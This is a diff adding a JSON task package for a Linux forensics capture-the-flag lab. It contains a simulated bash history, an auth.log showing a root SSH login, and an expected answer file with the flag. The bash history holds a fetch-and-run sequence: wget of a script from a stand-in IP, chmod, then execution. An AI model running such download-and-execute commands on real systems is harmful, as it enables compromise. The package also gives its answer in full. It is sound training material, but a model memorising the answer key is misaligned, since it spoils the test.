@@ -1,0 +1,27 @@
+{
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Задача\n\nСобран дамп артефактов Linux-хоста: `bash_history.txt` и `auth.log`. Найди признак компрометации и флаг.\n\nПросмотри историю команд и журнал входов.\n"
+    },
+    {
+      "path": "/home/student/task/bash_history.txt",
+      "text": "ls -la\ncd /tmp\nwget http://198.51.100.7/x.sh\nchmod +x x.sh\n./x.sh\nexport SECRET=nto{l1nux_4rt1f4cts_p3rs1st3nc3}\necho done\n"
+    },
+    {
+      "path": "/home/student/task/auth.log",
+      "text": "Sep 12 03:14:01 host sshd[2044]: Accepted password for root from 203.0.113.9\nSep 12 03:14:02 host sshd[2044]: session opened for user root\n"
+    }
+  ],
+  "id": "forensics-linux-artifacts-deep",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{l1nux_4rt1f4cts_p3rs1st3nc3}"
+  }
+}
